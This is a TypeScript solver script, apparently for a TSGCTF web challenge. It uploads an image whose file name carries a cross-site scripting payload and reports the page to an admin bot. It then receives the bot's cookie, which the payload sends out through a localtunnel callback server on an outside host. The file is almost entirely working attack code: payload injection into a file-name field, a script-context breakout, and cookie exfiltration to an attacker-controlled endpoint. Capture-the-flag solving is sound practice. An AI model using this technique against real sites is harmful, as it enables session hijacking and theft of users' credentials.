import axios, { AxiosResponse } from 'axios';
import localtunnel from 'localtunnel';
import express from 'express';
import * as qs from 'querystring';
import {Server} from 'http';
import fs from 'fs/promises';
import assert from 'assert';
import crypto from 'crypto';

if (process.argv.length !== 4) {
	console.error('Usage: ts-node solver.ts <host> <port>');
	process.exit(1);
}

const [, , host, port] = process.argv;

let res: AxiosResponse<any>;

(async () => {
	const app = express();
	const flagPromise = new Promise((resolve) => {
		app.get('/report', (req, res) => {
			res.send('ok');
			const flag = req.originalUrl.split('cookie=')[1];
			resolve(decodeURIComponent(flag));
		});
	});

	const server = await new Promise<Server>((resolve) => {
		const server = app.listen(3000, () => resolve(server));
	});
	console.log('server listening');

	const tunnel = await localtunnel({port: 3000, host: 'http://localtunnel.smallkirby.com'});
	console.log(`Tunnel created on ${tunnel.url}`);

	process.on('SIGINT', () => {
		tunnel.close();
		server.close();
		process.exit(1);
	});

	const url = new URL('/report', tunnel.url).toString();
	const unoImageBuffer = Buffer.concat([
		await fs.readFile('uno.png'),
		// Random bytes
		Buffer.from(Math.random().toString()),
	]);
	const unoImageId = crypto.createHash('md5').update(unoImageBuffer).digest('hex');

	const blob = new Blob([unoImageBuffer]);

	const payload = `![</script><script type=module src=/assets/index.test.js></script>](${unoImageId})/uno.png}];function describe(){location['href']='${url.replaceAll('/', '\\x2f').replaceAll('.', '\\x2e')}?'+document['cookie']};\`+`;
	console.log(`Payload: ${payload}`);

	const form = new FormData();
	form.append('image', blob, payload);

	res = await axios.post(`http://${host}:${port}/image`, form, {
		validateStatus: null,
	});

	assert(res.status === 500);
	console.log(`Submitted post (id = ${unoImageId})`);

	res = await axios.post(`http://${host}:${port}/report`, qs.stringify({
		url: `http://${host}:${port}/images/${unoImageId}`,
	}), {
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded',
		},
	});
	console.log(`Report result: ${res.data}`);

	setTimeout(() => {
		// force exit
		console.log('Timeout');
		tunnel.close();
		server.close();
		process.exit(1);
	}, 10 * 1000);

	const flag = (await flagPromise) as string;
	console.log(`Flag: ${flag}`);

	if (!flag.includes('TSGCTF{')) {
		process.exit(1);
	}

	tunnel.close();
	server.close();

	setTimeout(() => {
		// force exit
		process.exit(0);
	}, 100);
})();